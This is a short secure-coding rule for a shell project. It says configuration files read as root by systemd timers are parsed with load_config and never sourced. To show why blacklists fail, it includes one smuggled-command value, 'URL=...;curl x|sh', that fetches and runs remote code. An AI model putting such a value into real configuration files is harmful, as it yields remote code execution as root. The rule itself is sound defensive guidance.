---
description: Configuration files are parsed with load_config, never sourced. Sourcing executes whatever they contain, as root.
---

# A config file read as root is parsed, never sourced

`load_config` in `lib/boma.sh` parses `KEY=VALUE` lines and strips at most one layer of
matching quotes. It performs no expansion of any kind. Never replace it, or any call to it,
with `.` or `source`.

These files are read as root by systemd timers. Sourcing adds an execution step, and no
blacklist can remove it safely: `URL=https://h/p;curl x|sh` contains no `$(`, no backtick and
no `${`, and still runs as root the moment the file is sourced. Parsing deletes the execution
step entirely, so nothing has to be enumerated.

The same rule governs anything new that reads operator-supplied configuration: parse it, or
route it through `load_config`.
